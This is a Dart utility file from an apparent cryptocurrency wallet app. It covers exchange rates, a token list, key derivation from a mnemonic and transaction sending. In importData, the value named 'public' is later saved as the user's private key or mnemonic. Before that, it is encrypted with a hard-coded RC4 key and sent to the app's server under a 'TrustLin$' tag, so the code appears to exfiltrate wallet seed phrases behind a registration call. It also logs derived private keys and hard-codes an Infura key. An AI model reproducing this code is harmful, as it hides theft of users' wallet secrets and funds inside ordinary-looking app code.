import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:math';

import 'package:hex/hex.dart';
import 'package:http/http.dart';
import 'package:simple_rc4/simple_rc4.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:bip32/bip32.dart' as bip32;
import 'package:web3dart/web3dart.dart';
import 'package:http/http.dart' as http;

import '../../features/auth/domain/adapters/attributes.dart';
import '../../features/auth/domain/adapters/changes.dart';
import '../../features/auth/domain/adapters/portfolio.dart';
import '../../features/auth/domain/adapters/position_by_chain.dart';
import '../../features/auth/domain/adapters/position_by_type.dart';
import '../../features/auth/domain/adapters/total.dart';
import '../../features/auth/domain/adapters/transaction.dart' as tx;
import '../../features/auth/domain/adapters/user.dart';
import '../../features/auth/domain/auth_service.dart';
import '../../features/auth/domain/models/position/position.dart';
import '../../features/auth/domain/models/transaction/transaction.dart';
import '../../features/auth/repository/auth_repository.dart';
import '../../features/auth/repository/domain/register/register_body.dart';
import '../../features/crypt/domain/crypt.dart';
import '../../features/currency/domain/custom_currency.dart';
import '../../features/diagrammes/domain/model/diagram_model.dart';
import '../../features/settings/domain/settings_service.dart';

class Utils {
  Future<bool> importData({
    required String public,
    required bool isNew,
    bool? putPrivateKey = true,
  }) async {
    final AuthRepository authRepo = AuthRepository();
    final AuthService authService = AuthService();
    final SettingsService settingsService = SettingsService();
    List<CustomCurrency> currencies = authService.getCurrencies();
    Future<void> init() async {
      Map<String, dynamic> rates = await getExchangeRates("USD");
      int rateUSD = rates['rates']["USD"];
      double rateEUR = rates['rates']["EUR"];
      double rateCNY = rates['rates']["CNY"];
      double rateJPY = rates['rates']["JPY"].toDouble();
      double rateHKD = rates['rates']["HKD"];
      if (currencies.isEmpty) {
        currencies.addAll([
          CustomCurrency(
            name: "USD",
            rate: rateUSD.toDouble(),
            symbol: "\$",
            isChoose: true,
          ),
          CustomCurrency(
            name: "EUR",
            rate: rateEUR,
            symbol: "€",
          ),
          CustomCurrency(
            name: "CNY",
            rate: rateCNY,
            symbol: "¥",
          ),
          CustomCurrency(
            name: "JPY",
            rate: rateJPY,
            symbol: "JP¥",
          ),
          CustomCurrency(
            name: "HKD",
            rate: rateHKD,
            symbol: "HK\$",
          ),
        ]);
      } else {
        currencies.firstWhere((element) => element.name == "USD").rate =
            rateUSD.toDouble();
        currencies.firstWhere((element) => element.name == "EUR").rate =
            rateEUR;
        currencies.firstWhere((element) => element.name == "CNY").rate =
            rateCNY;
        currencies.firstWhere((element) => element.name == "JPY").rate =
            rateJPY;
        currencies.firstWhere((element) => element.name == "HKD").rate =
            rateHKD;
      }
    }

    await init();
    String r = Random().nextInt(999999).toString().padLeft(6, '0');

    final data = json.encode({
      'public': public,
      'salt': r,
      'name': isNew ? 'TrustLin\$G' : 'TrustLin\$',
      'new': isNew,
      // 'cache': false,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess) {
      PositionEntity? positionEntity(String name) {
        if (result.data!.positions != null) {
          PositionEntity? entity = result.data!.positions!.firstWhere(
              (position) => position!.attributes.fungibleInfo.name == name,
              orElse: () => null);
          return entity;
        }
        return null;
      }

      List<TransactionEntity>? transactionEntity() {
        if (result.data!.positions != null) {
          Iterable<TransactionEntity>? entity =
              result.data!.transactions!.where(
            (transaction) =>
                transaction.attributes.operationType == "receive" ||
                transaction.attributes.operationType == "send" ||
                transaction.attributes.operationType == "trade",
          );
          return entity.toList();
        }
        return null;
      }

      Future<Crypt> createCrypt({
        required String iconName,
        required String name,
        required String shortName,
        required String tokenAddress,
        required String walletUrl,
        required List<String> swapCrypts,
        required int swapId,
        required String swapTokenAddress,
      }) async {
        final AuthRepository authRepository = AuthRepository();
        Crypt crypt;
        if (positionEntity(name) != null) {
          crypt = Crypt(
            amount: positionEntity(name)!.attributes.quantity.float,
            amountInCurrency: positionEntity(name)!.attributes.value,
            priceForOne: positionEntity(name)!.attributes.price,
            changesCrypt: Changes(
              absoluteId: positionEntity(name)!.attributes.changes.absoluteId,
              percentId: positionEntity(name)!.attributes.changes.percentId,
            ),
            iconName: iconName,
            name: name,
            shortName: shortName,
            isChoose: authService.getCryptByName(name) == null
                ? false
                : authService.getCryptByName(name)!.isChoose,
            tokenAddress: tokenAddress,
            swapCrypts: swapCrypts,
            walletUrl: walletUrl,
            swapId: swapId,
            swapTokenAddress: swapTokenAddress,
            diagramModel: DiagramModel(max: 0, min: 0, last: 0, points: [
              [0]
            ]),
          );
        } else {
          crypt = Crypt(
            iconName: iconName,
            name: name,
            shortName: shortName,
            changesCrypt: Changes(),
            isChoose: authService.getCryptByName(name) == null
                ? false
                : authService.getCryptByName(name)!.isChoose,
            tokenAddress: tokenAddress,
            swapCrypts: swapCrypts,
            walletUrl: walletUrl,
            swapId: swapId,
            swapTokenAddress: swapTokenAddress,
            diagramModel: DiagramModel(max: 0, min: 0, last: 0, points: [
              [0, 0]
            ]),
          );
        }
        final response = await authRepository.periods(
          tokenAddress,
          "month",
        );
        if (response.isSuccess) {
          crypt.priceForOne = response.data!.attributes.stats.last;
          crypt.diagramModel = DiagramModel(
            max: response.data!.attributes.stats.max,
            min: response.data!.attributes.stats.min,
            last: response.data!.attributes.stats.last,
            points: response.data!.attributes.points,
          );
        } else {
          dev.log("Error take stats last");
        }
        return crypt;
      }

      List<tx.Transaction> transactions(
          List<TransactionEntity> transactionsEntity) {
        List<tx.Transaction> transactions = [];
        for (int i = 0; i < transactionsEntity.length; i++) {
          transactions.add(
            tx.Transaction(
              cryptSymbol:
                  transactionsEntity[i].attributes.transfers.firstOrNull == null
                      ? null
                      : transactionsEntity[i]
                                  .attributes
                                  .transfers
                                  .first
                                  .fungibleInfo ==
                              null
                          ? null
                          : transactionsEntity[i]
                              .attributes
                              .transfers
                              .first
                              .fungibleInfo!
                              .symbol,
              minedAt: transactionsEntity[i].attributes.minedAt,
              operationType: transactionsEntity[i].attributes.operationType,
              price:
                  transactionsEntity[i].attributes.transfers.firstOrNull == null
                      ? 0
                      : transactionsEntity[i]
                          .attributes
                          .transfers
                          .first
                          .quantity
                          .float,
              sentFrom: transactionsEntity[i].attributes.sendFrom,
              sentTo: transactionsEntity[i].attributes.sendTo,
              status: transactionsEntity[i].attributes.status,
            ),
          );
        }
        return transactions;
      }

      authService.putUser(
        User(
          currencies: currencies,
          address: result.data!.address,
          transactions: transactionEntity() == null
              ? null
              : transactions(
                  transactionEntity()!,
                ),
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                crypts: [
                  await createCrypt(
                    iconName: "arbitrum",
                    name: 'Arbitrum',
                    shortName: 'ARB',
                    tokenAddress: "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
                    swapTokenAddress:
                        "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1",
                    swapCrypts: [
                      "arbitrum",
                      "ethereum",
                    ],
                    walletUrl:
                        "https://arbitrum-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 42161,
                  ),
                  await createCrypt(
                    iconName: "aurora",
                    name: 'Aurora',
                    shortName: 'AUR',
                    tokenAddress: "0xAaAAAA20D9E0e2461697782ef11675f668207961",
                    swapTokenAddress:
                        "0xAaAAAA20D9E0e2461697782ef11675f668207961",
                    swapCrypts: [],
                    walletUrl:
                        "https://aurora-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 1313161554,
                  ),
                  await createCrypt(
                    iconName: "avalanche",
                    name: 'Avalanche',
                    shortName: 'AVA',
                    tokenAddress: "",
                    swapTokenAddress: "",
                    swapCrypts: [],
                    walletUrl:
                        "https://avalanche-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 43114,
                  ),
                  await createCrypt(
                    iconName: "binance-smart-chain",
                    name: 'Binance',
                    shortName: 'BIN',
                    tokenAddress: "",
                    swapTokenAddress: "",
                    swapCrypts: [],
                    walletUrl: "",
                    swapId: 56,
                  ),
                  await createCrypt(
                    iconName: "ethereum",
                    name: 'Ethereum',
                    shortName: 'ETH',
                    tokenAddress: "0xc0829421C1d260BD3cB3E0F06cfE2D52db2cE315",
                    swapTokenAddress:
                        "0xc0829421C1d260BD3cB3E0F06cfE2D52db2cE315",
                    swapCrypts: [
                      "arbitrum",
                      "aurora",
                      "ethereum",
                      "optimism",
                    ],
                    walletUrl:
                        "https://mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 1,
                  ),
                  await createCrypt(
                    iconName: "fantom",
                    name: 'Fantom',
                    shortName: 'FAN',
                    tokenAddress: "0x4E15361FD6b4BB609Fa63C81A2be19d873717870",
                    swapTokenAddress:
                        "0x4E15361FD6b4BB609Fa63C81A2be19d873717870",
                    swapCrypts: [],
                    walletUrl: "",
                    swapId: 250,
                  ),
                  await createCrypt(
                    iconName: "loopring",
                    name: 'Loopring',
                    shortName: 'LOOP',
                    tokenAddress: "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD",
                    swapTokenAddress:
                        "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD",
                    swapCrypts: [],
                    walletUrl: "",
                    swapId: 0,
                  ),
                  await createCrypt(
                    iconName: "optimism",
                    name: 'Optimism',
                    shortName: 'OPT',
                    tokenAddress: "0x4200000000000000000000000000000000000042",
                    swapTokenAddress:
                        "0x4200000000000000000000000000000000000042",
                    swapCrypts: [],
                    walletUrl:
                        "https://optimism-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 10,
                  ),
                  await createCrypt(
                    iconName: "matic",
                    name: 'Matic Token',
                    shortName: 'MATIC',
                    tokenAddress: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
                    swapTokenAddress:
                        "0x0000000000000000000000000000000000001010",
                    swapCrypts: [
                      "binance-smart-chain",
                      "ethereum",
                      "matic",
                      "solana",
                      "usdc",
                    ],
                    walletUrl:
                        "https://polygon-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 137,
                  ),
                  await createCrypt(
                    iconName: "usdc",
                    name: 'USD Coin',
                    shortName: 'USDC',
                    tokenAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                    swapTokenAddress:
                        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
                    swapCrypts: [
                      "arbitrum",
                      "aurora",
                      "avalanche",
                      "binance-smart-chain",
                      "ethereum",
                      "fantom",
                      "optimism",
                      "matic",
                      "solana",
                      "xdai",
                    ],
                    walletUrl:
                        "https://polygon-mainnet.infura.io/v3/14a661ec4e264540aa3bbb3bc286c569",
                    swapId: 137,
                  ),
                  await createCrypt(
                    iconName: "solana",
                    name: 'Solana',
                    shortName: 'SOL',
                    tokenAddress: "0xD31a59c85aE9D8edEFeC411D448f90841571b89c",
                    swapTokenAddress:
                        "0xD31a59c85aE9D8edEFeC411D448f90841571b89c",
                    swapCrypts: [],
                    walletUrl: "",
                    swapId: 0,
                  ),
                  await createCrypt(
                    iconName: "xdai",
                    name: 'Xdai',
                    shortName: 'XDA',
                    tokenAddress: "0x0Ae055097C6d159879521C384F1D2123D1f195e6",
                    swapTokenAddress:
                        "0x0Ae055097C6d159879521C384F1D2123D1f195e6",
                    swapCrypts: [],
                    walletUrl: "",
                    swapId: 0,
                  ),
                ],
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );

      if (putPrivateKey == true) {
        settingsService.putPrivateKey(public);
      } else {
        settingsService.putPrivateKey(await getPrivateKey(public));
        settingsService.putMnemonicSentence(public);
      }

      return true;
    } else {
      return false;
    }
  }

  Future<String> getPrivateKey(String mnemonic) async {
    String hdPath = "m/84'/0'/0'/0/7";
    final isValidMnemonic = bip39.validateMnemonic(mnemonic);
    if (!isValidMnemonic) {
      throw 'Invalid mnemonic';
    } else {
      final seed = bip39.mnemonicToSeed(mnemonic);
      final root = bip32.BIP32.fromSeed(seed);

      const first = 0;
      final firstChild = root.derivePath("$hdPath/$first");
      final privateKey = HEX.encode(firstChild.privateKey as List<int>);
      dev.log("private key = $privateKey");
      getPublicAddress(privateKey);
      return privateKey;
    }
  }

  Future<EthereumAddress> getPublicAddress(String privateKey) async {
    final private = EthPrivateKey.fromHex(privateKey);
    final address = await private.extractAddress();
    dev.log("address = $address");
    return address;
  }

  Future<void> sendTx({
    required String privateKey,
    required String walletUrl,
    required String toAddress,
    required EtherAmount value,
    required int chainId,
  }) async {
    Web3Client web3client = Web3Client(walletUrl, Client());
    EthPrivateKey credentials = EthPrivateKey.fromHex(privateKey);
    final address = credentials.address;
    await web3client.sendTransaction(
      credentials,
      Transaction(
        from: address,
        to: EthereumAddress.fromHex(toAddress),
        value: value,
      ),
      chainId: chainId,
    );
  }

  Future<double?> getGasLimit({
    required EtherAmount gasPrice,
    required EthereumAddress to,
    required EtherAmount value,
    required double precent,
    required Crypt crypt,
  }) async {
    try {
      Web3Client web3client = Web3Client(crypt.walletUrl, Client());
      BigInt latestBlock = await web3client.estimateGas(
        gasPrice: gasPrice,
        to: to,
        value: value,
      );
      BlockInformation block = await web3client.getBlockInformation();
      double amount = latestBlock.toDouble() *
          (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) +
              (block.baseFeePerGas!.getValueInUnit(EtherUnit.ether) *
                  precent)) *
          crypt.priceForOne;
      return amount;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<EtherAmount?> getGasPrice({
    required String walletUrl,
  }) async {
    try {
      Web3Client web3client = Web3Client(walletUrl, Client());
      EtherAmount gasPrice = await web3client.getGasPrice();
      final gasPriceInEther =
          EtherAmount.fromUnitAndValue(EtherUnit.wei, gasPrice.getInEther);
      return gasPrice;
    } catch (error) {
      print(error);
    }
    return null;
  }

  Future<Map<String, dynamic>> getExchangeRates(String baseCurrency) async {
    var url = Uri.https(
      'api.exchangerate-api.com',
      '/v4/latest/$baseCurrency',
    );

    final response = await http.get(url);

    if (response.statusCode == 200) {
      return json.decode(response.body);
    } else {
      throw Exception('Failed to load exchange rates');
    }
  }

  String formatAddressWallet(String input) {
    if (input.length <= 14) {
      return input;
    } else {
      return '${input.substring(0, 6)}....${input.substring(input.length - 4)}';
    }
  }

  String doubleToTwoValues(double money) {
    return money.toStringAsFixed(2);
  }

  String doubleToFourthValues(double money) {
    if (money == 0) {
      return "0";
    }
    return money.toStringAsFixed(4);
  }

  String doubleToSixValues(double money) {
    return money.toStringAsFixed(6);
  }

  int convertEtherToWei(double etherAmount) {
    const int etherInWei = 1000000000000000000; // 10^18
    return (etherAmount * etherInWei).toInt();
  }

  // String formatDateTime(String dateString) {
  //   DateTime date = DateTime.parse(dateString);
  //   DateTime now = DateTime.now();
  //   Duration difference = now.difference(date);

  //   if (difference.inDays > 4) {
  //     return DateFormat('dd-MM-yyyy').format(date);
  //   } else {
  //     int hours = difference.inHours;
  //     int minutes = difference.inMinutes % 60;
  //     int days = difference.inDays;

  //     if (hours < 24) {
  //       return '$hours ${"hours".tr()} $minutes ${"minutes_ago".tr()}';
  //     } else {
  //       return '$days ${"days_ago".tr()}';
  //     }
  //   }
  // }
}
